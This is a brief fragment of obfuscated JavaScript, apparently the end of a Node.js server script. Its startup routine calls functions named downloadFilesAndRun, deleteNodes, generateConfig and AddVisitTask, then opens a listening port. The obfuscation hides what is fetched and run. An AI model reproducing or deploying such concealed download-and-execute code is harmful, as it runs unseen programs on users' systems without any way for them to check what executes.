console[_0x3dc45a(0x1c4)](_0x3dc45a(0x1b1)+_0x133ea5[_0x3dc45a(0x238)]),null;}}async function startserver(){const _0x45c12b=_0x1dd1c3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x314317){console[_0x45c12b(0x1c4)](_0x45c12b(0x220),_0x314317);}}startserver()[_0x1dd1c3(0x25a)](_0x24b444=>{const _0x35cbda=_0x1dd1c3;console[_0x35cbda(0x1c4)](_0x35cbda(0x245),_0x24b444);}),app[_0x1dd1c3(0x1c9)](PORT,()=>console[_0x1dd1c3(0x209)](_0x1dd1c3(0x19f)+PORT+'!'));
